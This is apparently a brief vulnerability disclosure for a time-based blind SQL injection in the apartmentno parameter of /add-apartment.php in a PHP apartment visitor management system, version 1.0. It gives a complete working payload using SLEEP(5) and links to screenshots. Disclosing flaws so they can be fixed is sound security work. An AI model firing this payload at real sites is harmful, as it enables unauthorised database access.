# The apartment visitor management system has SQL injection vulnerability

## Vulnerability author:wanglun

supplier:
https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code

edition: 
1.0

/add-apartment.php

The apartmentno parameter has SQL injection. Procedure

Payload: apartmentno=qewqe' AND (SELECT 8387 FROM (SELECT(SLEEP(5)))kVPh) AND 'yYSF'='yYSF&apartmentstatus=Owned&buildingno=C&submit=

![image](https://github.com/user-attachments/assets/06c192d3-eb0a-4302-9914-91f850d34f81)

![image](https://github.com/user-attachments/assets/056d120e-6698-4a95-9528-cee9c3074e59)

